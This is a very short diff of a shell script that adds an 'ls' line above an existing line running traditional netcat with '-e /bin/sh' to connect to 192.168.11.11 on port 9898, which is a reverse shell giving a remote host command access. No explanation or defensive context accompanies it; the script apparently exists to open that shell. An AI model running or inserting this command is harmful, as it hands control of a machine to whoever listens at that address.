@@ -1,3 +1,4 @@
 #!/bin/sh
+ls
 ./nc.trad -e /bin/sh 192.168.11.11 9898
 exit 0
